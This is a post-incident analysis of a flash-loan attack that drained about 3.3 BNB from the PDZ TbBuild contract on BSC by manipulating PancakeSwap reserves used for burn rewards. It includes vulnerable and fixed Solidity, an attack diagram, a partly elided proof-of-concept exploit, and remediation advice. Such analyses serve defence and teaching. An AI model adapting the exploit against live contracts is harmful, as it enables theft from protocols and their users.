# PDZ — Flash Loan-Based Reward Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-08 |
| **Protocol** | PDZ (TbBuild) |
| **Chain** | BSC |
| **Loss** | ~3.3 BNB |
| **Attacker** | [0x48234fb95d4d3e5a09f3ec4dd57f68281b78c825](https://bscscan.com/address/0x48234fb95d4d3e5a09f3ec4dd57f68281b78c825) |
| **Attack Tx** | [0x81fd00ea...](https://bscscan.com/tx/0x81fd00eab3434eac93bfdf919400ae5ca280acd891f95f47691bbe3cbf6f05a5) |
| **Vulnerable Contract** | [0x664201579057f50D23820d20558f4b61bd80BDda](https://bscscan.com/address/0x664201579057f50D23820d20558f4b61bd80BDda) |
| **Root Cause** | BNB reward calculation in `burnToHolder` relies on manipulable PancakeSwap pair reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/PDZ_exp.sol) |

---

## 1. Vulnerability Overview

The PDZ protocol's `TbBuild` contract pays BNB rewards when users burn PDZ tokens via the `burnToHolder` function. Since the reward calculation is based on the current token balance of the PancakeSwap pool, an attacker borrowed WBNB via a PancakeSwap flash swap, purchased a large amount of PDZ to manipulate the price, then collected rewards at the inflated price — draining approximately 3.3 BNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: reward calculation based on spot balance
function burnToHolder(uint256 amount, address _invitation) external {
    // Burns PDZ tokens and pays BNB reward
    // Uses current pair reserve for reward calculation → manipulable
    uint256 bnbReward = calculateReward(amount, pair.reserve0(), pair.reserve1());
    _burn(msg.sender, amount);
    payable(msg.sender).transfer(bnbReward);
}

// ✅ Recommended fix: use TWAP or fixed rate
function burnToHolder(uint256 amount, address _invitation) external {
    uint256 bnbReward = amount * FIXED_RATE / 1e18; // tamper-proof fixed rate
    _burn(msg.sender, amount);
    payable(msg.sender).transfer(bnbReward);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: PDZ_decompiled.sol
contract PDZ {
    function burnToHolder(uint256 a, address b) external {  // ❌ Vulnerability
        // TODO: decompiled logic not yet implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ PancakeSwap flash swap (borrow 10 WBNB)
  │
  ├─[2]─▶ Swap WBNB → PDZ (drive up PDZ price)
  │         └─ Pool PDZ reserve decreases, BNB reserve increases
  │
  ├─[3]─▶ Call TbBuild.burnToHolder(PDZ)
  │         └─ Collect inflated BNB reward based on manipulated reserves
  │
  ├─[4]─▶ Collect additional rewards via TbBuild.receiveRewards()
  │
  ├─[5]─▶ Swap PDZ back to WBNB
  │
  └─[6]─▶ Repay flash swap + retain profit
              └─ ~3.3 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    // [1] Borrow 10 WBNB via PancakeSwap flash swap
    IPancakePair(PANCAKE_PAIR).swap(10 ether, 0, address(this), hex"00");
}

function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
    IERC20 wbnb = IERC20(WBNB_ADDR);
    IERC20 pdz = IERC20(PDZ_TOKEN);
    IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));

    // [2] Buy large amount of PDZ with borrowed WBNB → manipulate pool reserves
    address[] memory path = new address[](2);
    path[0] = WBNB_ADDR;
    path[1] = PDZ_TOKEN;
    wbnb.approve(address(router), type(uint256).max);
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(...);

    // [3] Call burnToHolder at manipulated price → receive excess BNB
    pdz.approve(TB_BUILD, type(uint256).max);
    ITbBuild(TB_BUILD).burnToHolder(pdz.balanceOf(address(this)), address(0));

    // [4] Collect additional rewards
    ITbBuild(TB_BUILD).receiveRewards(address(this));

    // [5] Swap remaining PDZ back to WBNB
    // [6] Repay flash swap including fees
    wbnb.transfer(PANCAKE_PAIR, _amount0 * 1003 / 1000 + 1);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Vector** | Flash swap + AMM reserve manipulation |
| **Impact** | Excess reward collection |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP Classification** | Oracle / Price Manipulation |

## 6. Remediation Recommendations

1. **Use TWAP for reward calculation**: Use a time-weighted average price that is not affected by short-term price fluctuations.
2. **Fixed rate based on burn amount**: Calculate rewards using a pre-configured fixed rate rather than spot price.
3. **Set reward caps**: Limit the maximum reward claimable in a single transaction.
4. **Flash loan detection**: Block execution of sensitive functions when large liquidity movements occur within the same block.

## 7. Lessons Learned

- AMM reserve-based reward calculations are a classic target for flash loan attacks.
- Burn-to-reward mechanisms must use manipulation-resistant price references.
- Even when losses are relatively small, the vulnerable pattern itself can be replicated in larger protocols and must be patched immediately.